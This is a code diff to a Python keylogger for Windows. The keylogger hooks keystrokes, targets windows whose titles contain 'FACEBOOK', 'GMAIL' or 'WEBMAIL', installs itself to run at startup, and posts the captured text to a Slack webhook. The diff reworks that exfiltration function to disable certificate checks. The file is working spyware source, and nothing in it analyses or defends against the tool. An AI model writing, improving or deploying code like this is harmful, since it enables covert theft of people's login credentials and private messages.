@@ -5,7 +5,8 @@ import sys
 import win32event, win32api, winerror
 import configparser
 import time
-import requests, json
+import json
+from requests import Session, Request
 from datetime import datetime
 from _winreg import *
 from os.path import join, abspath
@@ -27,8 +28,6 @@ FILE = 'logfile.log'
 DATA = ''
 DATA_LENGTH = 50
 
-cert_path = os.path.join(getattr(sys, '_MEIPASS', os.path.abspath(".")), 'cacert.pem')
-requests.utils.DEFAULT_CA_BUNDLE_PATH = cert_path
 # Keywords for algorithm
 key_words = ['FACEBOOK', 'GMAIL', 'WEBMAIL']
 
@@ -82,13 +81,11 @@ def log_on_file(file, DATA):
 
 def log_on_cloud(url, DATA):
 	'''log the DATA collected in a Slack server'''
-	payload = {'text': DATA}
-	try:
-		r = requests.post(url, data=json.dumps(payload, ensure_ascii=False), headers={'Content-Type': 'application/json'}, verify=cert_path)
-		# sol1: add verify=False (not always working)
-		print r.status_code
-	except:
-		print 'failed'
+	with Session() as s:
+		payload = {'text': DATA}
+		response = s.post(url=url, data=json.dumps(payload, ensure_ascii=False), headers={'Content-Type': 'application/json'}, verify=False)
+		# verify=False -> dont need any certificate, but the exe works only for one post request
+		print(response.status_code)
 
 #################################
 #		ALGORITHM RELEVANT  	#
@@ -110,6 +107,7 @@ def is_relevant_window(WindowName, key_words):
 ####################
 
 if __name__ == '__main__':
+	# comment persist() if you don't want the code to run at startup of the computer
 	persist()
 	hm = pyHook.HookManager()
 	hm.SubscribeKeyDown(on_keyboard)
